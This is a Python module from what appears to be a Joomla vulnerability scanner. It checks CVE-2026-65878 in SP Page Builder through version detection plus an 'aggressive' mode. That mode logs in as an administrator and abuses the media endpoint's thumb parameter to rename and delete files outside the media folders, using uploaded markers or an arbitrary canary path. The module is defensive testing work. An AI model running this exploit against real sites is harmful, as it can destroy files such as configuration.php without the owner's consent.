from __future__ import annotations

import json
import re
import secrets
from typing import Any
from urllib.parse import urlencode

from ...core.http import (
    HttpClient,
    build_multipart,
    form_encode,
    is_transport_error,
    normalize_url,
    transport_error_detail,
)
from ...core.models import Finding
from ...core.versions import parse_version_safe

CVE_ID = "CVE-2026-65878"
NAME = "SP Page Builder authenticated arbitrary file rename/delete"
COMPONENT = "SP Page Builder"
AFFECTED_RULE = "SP Page Builder 1.0.0 through 6.7.0; fixed in 6.7.1"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["safe", "aggressive"]
ADMIN_LOGIN = "/administrator/index.php"
MEDIA_ENDPOINT = "/administrator/index.php?option=com_sppagebuilder&task=editor.media"
TOKEN_RE = re.compile(r'name="([a-f0-9]{32})" value="1"|"csrf\.token":"([a-f0-9]{32})"')
BROWSER_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"


def _numeric_version(version: str | None) -> str | None:
    match = re.match(r"\s*(\d+(?:\.\d+)+)", str(version or ""))
    return match.group(1) if match else None


def classify_version(version: str | None) -> str:
    parsed = parse_version_safe(_numeric_version(version))
    fixed = parse_version_safe("6.7.1")
    first_affected = parse_version_safe("1.0.0")
    if parsed is None or fixed is None or first_affected is None:
        return "DETECTED_VERSION_UNKNOWN"
    if parsed < first_affected:
        return "NOT_AFFECTED"
    return "LIKELY_VULNERABLE" if parsed < fixed else "NOT_AFFECTED"


def passive_result(plugins: dict[str, Any] | None) -> Finding:
    info = (plugins or {}).get("sppagebuilder", {})
    if not info.get("found"):
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="NOT_DETECTED",
            confidence="MEDIUM",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            detail="SP Page Builder was not detected through its public manifest or asset paths.",
            action="No action is required unless SP Page Builder is installed but hidden from public detection.",
        )

    version = info.get("version")
    status = classify_version(version)

    if status == "LIKELY_VULNERABLE":
        detail = (
            f"Detected SP Page Builder {version}. The media manager trusts the request path/thumb "
            "and the record id, so a user with media permissions can rename or delete files outside "
            "the configured media folders (for example configuration.php or .htaccess)."
        )
        action = "Upgrade SP Page Builder to 6.7.1 or newer."
        confidence = "HIGH"
    elif status == "NOT_AFFECTED":
        detail = (
            f"Detected SP Page Builder {version}, which resolves the media record by path and "
            "confines rename/delete to the configured media folders."
        )
        action = "No action is required for this CVE if version detection is accurate."
        confidence = "HIGH"
    else:
        detail = "SP Page Builder was detected, but its version could not be determined."
        action = "Determine the installed SP Page Builder version and upgrade to 6.7.1 or newer."
        confidence = "MEDIUM"

    return Finding(
        cve=CVE_ID,
        name=NAME,
        status=status,
        confidence=confidence,
        component=COMPONENT,
        component_version=version,
        affected_rule=AFFECTED_RULE,
        exploit_available=True,
        detail=detail,
        action=action,
    )


def _token(body: str) -> str | None:
    match = TOKEN_RE.search(body)
    if not match:
        return None
    return match.group(1) or match.group(2)


def _admin_login(client: HttpClient, base: str, username: str, password: str, timeout: int) -> str | None:
    page = client.get(f"{base}{ADMIN_LOGIN}", timeout=timeout)
    if is_transport_error(page):
        return None
    login_token = _token(page.get("body") or "")
    if not login_token:
        return None
    response = client.request(
        f"{base}{ADMIN_LOGIN}",
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": BROWSER_UA},
        data=form_encode(
            {
                "username": username,
                "passwd": password,
                "option": "com_login",
                "task": "login",
                "return": "aW5kZXgucGhw",
                login_token: "1",
            }
        ),
        timeout=timeout,
    )
    if is_transport_error(response):
        return None
    page = client.get(f"{base}{ADMIN_LOGIN}", timeout=timeout)
    if is_transport_error(page):
        return None
    return _token(page.get("body") or "")


def _json_data(body: str) -> dict[str, Any]:
    try:
        parsed = json.loads(body)
    except (json.JSONDecodeError, TypeError):
        return {}
    data = parsed.get("data") if isinstance(parsed, dict) else None
    return data if isinstance(data, dict) else {}


def _php_filename(path: str) -> str:
    base = path.rsplit("/", 1)[-1]
    if base.startswith(".") and base.count(".") == 1:
        return base
    return base.rsplit(".", 1)[0] if "." in base else base


def replace_path_by_title(path: str, title: str) -> str:
    """Mirror the pre-fix PHP replacePathByTitle().

    ``str_replace($fileName, $title, $basename)`` rewrites every occurrence of
    the stem, so ``jpg.jpg`` renamed to ``php`` becomes ``php.php``. The
    destination keeps the directory of the source path.
    """
    if not path:
        return ""
    base = path.rsplit("/", 1)[-1]
    if not base:
        return path
    new_base = base.replace(_php_filename(path), title)
    return path.replace(base, new_base)


def _get_status(client: HttpClient, url: str, timeout: int) -> tuple[int, str]:
    response = client.get(url, timeout=timeout)
    if is_transport_error(response):
        return 0, ""
    return response.get("status", 0), response.get("body") or ""


def _upload(
    client: HttpClient,
    base: str,
    token: str,
    folder: str,
    filename: str,
    marker: str,
    timeout: int,
) -> tuple[dict[str, Any], int]:
    content_type, body = build_multipart(
        {"_method": "POST", "folder": folder, token: "1"},
        {"file[]": (filename, marker.encode(), "application/json")},
    )
    response = client.request(
        f"{base}{MEDIA_ENDPOINT}",
        method="POST",
        headers={"Content-Type": content_type, "User-Agent": BROWSER_UA},
        data=body,
        timeout=timeout,
    )
    if is_transport_error(response):
        return {}, 0
    return _json_data(response.get("body") or ""), response.get("status", 0)


def _delete_record(
    client: HttpClient,
    base: str,
    token: str,
    path: str,
    timeout: int,
) -> tuple[int, dict[str, Any]]:
    query = urlencode({"_method": "DELETE", token: "1"})
    response = client.request(
        f"{base}{MEDIA_ENDPOINT}&{query}",
        method="DELETE",
        headers={
            "Content-Type": "application/json",
            "User-Agent": BROWSER_UA,
            "X-CSRF-Token": token,
        },
        data=json.dumps({"data": [{"type": "local", "path": path}]}),
        timeout=timeout,
    )
    if is_transport_error(response):
        return 0, {}
    return response.get("status", 0), _json_data(response.get("body") or "")


def run_aggressive_probe(
    target_url: str,
    username: str | None = None,
    password: str | None = None,
    canary: str | None = None,
    folder: str = "",
    timeout: int = 20,
    proxy: str | None = None,
) -> Finding:
    """Rename a file outside the media folders and delete it through the record.

    The pre-fix media endpoint renames ``JPATH_ROOT/$path`` to the title-derived
    path and also renames the request-supplied ``thumb``. The record's thumb is
    then deleted with the record. The probe uploads a marker to ``folder``
    (default: the configured media folder), uses a second uploaded marker or the
    supplied canary as ``thumb``, verifies the move over HTTP, then deletes the
    record.
    """
    base = normalize_url(target_url)
    if not username or not password:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="BLOCKED_EXTERNAL",
            confidence="MEDIUM",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=False,
            proof_url=f"{base}{ADMIN_LOGIN}",
            detail=(
                "The rename/delete proof needs a Joomla user with core.manage on com_sppagebuilder and "
                "media permissions. Pass --aggressive-arg username=... password=... (and optionally "
                "canary=<path>) on an authorized staging site. Nothing was sent."
            ),
            action="Re-run with lab administrator credentials.",
        )

    client = HttpClient(timeout=timeout, proxy=proxy)
    token = _admin_login(client, base, username, password, timeout)
    if not token:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="NOT_CONFIRMED",
            confidence="MEDIUM",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=f"{base}{ADMIN_LOGIN}",
            detail="The login did not establish a session or expose a CSRF token; the media probe was not attempted.",
            action="Verify the lab credentials and administrator login route.",
        )

    suffix = secrets.token_hex(4)
    filename = f"proofcms-65878-{suffix}.json"
    marker = f"PROOFCMS_65878_{suffix.upper()}"
    upload_data, upload_status = _upload(client, base, token, folder, filename, marker, timeout)
    uploaded_path = str(upload_data.get("path") or "")
    uploaded_id = upload_data.get("id")

    if not upload_data.get("status") or not uploaded_path:
        if upload_status in (401, 403):
            status = "BLOCKED_EXTERNAL"
            detail = "The media upload was rejected before writing; the user lacks the editor/media ACL or the token was rejected."
            action = "Use a lab user with core.manage and media create permissions."
        elif upload_status == 400:
            status = "NOT_AFFECTED"
            detail = (
                "The media upload to the request-supplied folder was rejected with 400, the fixed "
                "SecurityHelper::isGetablePath() behaviour."
            )
            action = "No action is required for this CVE if the version is 6.7.1 or newer."
        else:
            status = "NOT_CONFIRMED"
            detail = "The media upload was not accepted and no file path was returned."
            action = "Review the upload response and the lab user's ACL before retrying."
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status=status,
            confidence="MEDIUM",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=f"{base}{MEDIA_ENDPOINT}",
            evidence={"folder": folder, "upload_status": upload_status},
            detail=detail,
            action=action,
        )

    thumb_path = canary
    thumb_marker: str | None = None
    thumb_upload_id: Any = None
    if not thumb_path:
        thumb_name = f"proofcms-65878-thumb-{suffix}.json"
        thumb_marker = f"PROOFCMS_65878_THUMB_{suffix.upper()}"
        thumb_data, _ = _upload(client, base, token, folder, thumb_name, thumb_marker, timeout)
        thumb_path = str(thumb_data.get("path") or "")
        thumb_upload_id = thumb_data.get("id")
        if not thumb_data.get("status") or not thumb_path:
            return Finding(
                cve=CVE_ID,
                name=NAME,
                status="NOT_CONFIRMED",
                confidence="MEDIUM",
                component=COMPONENT,
                affected_rule=AFFECTED_RULE,
                exploit_available=True,
                exploit_ran=True,
                proof_url=f"{base}{MEDIA_ENDPOINT}",
                evidence={"folder": folder, "uploaded_path": uploaded_path},
                detail="The first upload succeeded but the second marker used as the thumb did not.",
                action="Retry with a writable folder or supply --aggressive-arg canary=<path>.",
            )

    title = f"proofcms-65878-renamed-{suffix}"
    renamed_upload = replace_path_by_title(uploaded_path, title)
    renamed_thumb = replace_path_by_title(thumb_path, title)
    thumb_before_status, _ = _get_status(client, f"{base}/{thumb_path.lstrip('/')}", timeout)
    query = urlencode(
        {
            "_method": "PATCH",
            "id": str(uploaded_id or ""),
            "path": uploaded_path,
            "title": title,
            "thumb": thumb_path,
            token: "1",
        }
    )
    rename_response = client.request(
        f"{base}{MEDIA_ENDPOINT}&{query}",
        method="PATCH",
        headers={"User-Agent": BROWSER_UA, "X-CSRF-Token": token},
        timeout=timeout,
    )
    rename_status = 0 if is_transport_error(rename_response) else rename_response.get("status", 0)
    rename_data = {} if is_transport_error(rename_response) else _json_data(rename_response.get("body") or "")

    original_thumb_status, _ = _get_status(client, f"{base}/{thumb_path.lstrip('/')}", timeout)
    renamed_thumb_status, renamed_thumb_body = _get_status(client, f"{base}/{renamed_thumb.lstrip('/')}", timeout)
    moved = original_thumb_status == 404 and renamed_thumb_status == 200
    marker_matches = thumb_marker is None or thumb_marker in renamed_thumb_body

    evidence = {
        "folder": folder,
        "uploaded_path": uploaded_path,
        "uploaded_id": uploaded_id,
        "thumb_path": thumb_path,
        "renamed_upload": renamed_upload,
        "renamed_thumb": renamed_thumb,
        "rename_status": rename_status,
        "rename_success": rename_data.get("status") is True,
        "thumb_before_status": thumb_before_status,
        "original_thumb_status": original_thumb_status,
        "renamed_thumb_status": renamed_thumb_status,
        "thumb_moved": moved,
        "marker_matches": marker_matches,
    }

    if not (moved and marker_matches):
        fixed_behavior = (
            thumb_before_status == 200
            and original_thumb_status == 200
            and renamed_thumb_status == 404
        )
        if fixed_behavior:
            status = "NOT_AFFECTED"
            detail = (
                "The record rename succeeded but the request-supplied thumb was ignored: the file "
                "stayed at its original path. 6.7.1+ uses the stored record thumb instead."
            )
            action = "No action is required for this CVE if the version is 6.7.1 or newer."
            # Best-effort cleanup of the uploaded marker; the fixed build ignores the thumb.
            _delete_record(client, base, token, renamed_upload, timeout)
        elif rename_status in (401, 403):
            status = "BLOCKED_EXTERNAL"
            detail = "The media rename was rejected before the file move (ACL or CSRF token)."
        else:
            status = "NOT_CONFIRMED"
            detail = (
                "The rename response did not move the request-supplied thumb file. The build may be "
                "fixed, the thumb path may not exist, or the account lacks core.edit on com_sppagebuilder."
            )
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status=status,
            confidence="MEDIUM",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=f"{base}{MEDIA_ENDPOINT}",
            evidence=evidence,
            detail=detail,
            action=action,
        )

    delete_status, delete_data = _delete_record(client, base, token, renamed_upload, timeout)
    after_thumb_status, _ = _get_status(client, f"{base}/{renamed_thumb.lstrip('/')}", timeout)
    after_upload_status, _ = _get_status(client, f"{base}/{renamed_upload.lstrip('/')}", timeout)
    deleted = after_thumb_status == 404 and after_upload_status == 404

    evidence.update(
        {
            "delete_status": delete_status,
            "delete_success": delete_data.get("status") is True,
            "after_thumb_status": after_thumb_status,
            "after_upload_status": after_upload_status,
            "deleted": deleted,
            "thumb_upload_id": thumb_upload_id,
        }
    )

    if deleted:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="VULNERABLE",
            confidence="CONFIRMED",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=f"{base}{MEDIA_ENDPOINT}",
            evidence=evidence,
            detail=(
                "The media endpoint renamed a request-supplied thumb outside the media folders and the "
                "record delete removed it. An attacker with media access can point the thumb at "
                "configuration.php or .htaccess, move it, and delete it."
            ),
            action="Upgrade SP Page Builder to 6.7.1 or newer and review media records created by non-super users.",
        )

    return Finding(
        cve=CVE_ID,
        name=NAME,
        status="VULNERABLE",
        confidence="HIGH",
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        exploit_available=True,
        exploit_ran=True,
        proof_url=f"{base}{MEDIA_ENDPOINT}",
        evidence=evidence,
        detail=(
            "The media endpoint renamed the request-supplied thumb outside the media folders, proving "
            "the arbitrary rename primitive; the follow-up record delete did not remove the file."
        ),
        action="Upgrade SP Page Builder to 6.7.1 or newer and remove the moved file manually.",
    )


def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    base = normalize_url(target_url)
    url = f"{base}{ADMIN_LOGIN}"
    response = HttpClient(timeout=timeout, proxy=proxy).get(url, timeout=timeout)
    if is_transport_error(response):
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="ERROR",
            confidence="LOW",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=url,
            detail=f"The administrator page could not be reached ({transport_error_detail(response)}).",
            action="Retry when the target is reachable.",
        )
    return Finding(
        cve=CVE_ID,
        name=NAME,
        status="BLOCKED_EXTERNAL",
        confidence="MEDIUM",
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        exploit_available=True,
        exploit_ran=True,
        proof_url=url,
        detail="The administrator page is reachable; the media rename/delete payload was not sent in safe mode.",
        action="Use aggressive mode with media credentials on an authorized staging site.",
    )


def check(
    target_url: str,
    joomla_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 20,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    plugins: dict[str, Any] | None = None,
    aggressive_command: str | None = None,
    aggressive_args: dict[str, Any] | None = None,
    **kwargs: Any,
) -> Finding:
    from ...core.args import aggressive_value

    passive = passive_result(plugins)
    if not run_exploit_check:
        return passive

    if exploit_mode == "aggressive":
        if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
            passive.detail += " Aggressive proof skipped because SP Page Builder was not detected as potentially affected."
            return passive
        result = run_aggressive_probe(
            target_url,
            username=aggressive_value(aggressive_args, aggressive_command, "username"),
            password=aggressive_value(aggressive_args, aggressive_command, "password"),
            canary=aggressive_value(aggressive_args, aggressive_command, "canary"),
            folder=aggressive_value(aggressive_args, aggressive_command, "folder") or "",
            timeout=timeout,
            proxy=proxy,
        )
        result.component_version = passive.component_version
        return result

    if exploit_mode != "safe":
        passive.detail += " This module supports safe (administrator reachability) and aggressive (media rename/delete) modes."
        return passive

    if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
        return passive
    result = run_safe_probe(target_url, timeout, proxy)
    result.component_version = passive.component_version
    return result


def metadata() -> dict[str, Any]:
    return {
        "cve": CVE_ID,
        "cms": "joomla",
        "name": NAME,
        "component": COMPONENT,
        "affected_rule": AFFECTED_RULE,
        "affected_joomla_versions": ["*"],
        "exploit_available": True,
        "exploit_modes": EXPLOIT_MODES,
        "intrusive": INTRUSIVE,
        "vulnerability_type": "Path Traversal",
        "module_version": "1.0.0",
        "last_reviewed": "2026-11-20",
        "updated": "2026-11-20",
        "required_detectors": ["sppagebuilder"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-65878",
            "https://github.com/advisories/GHSA-c4j8-9w95-5986",
            "https://mysites.guru/vulnerabilities/CVE-2026-65878/",
            "https://www.joomshaper.com/page-builder",
        ],
    }
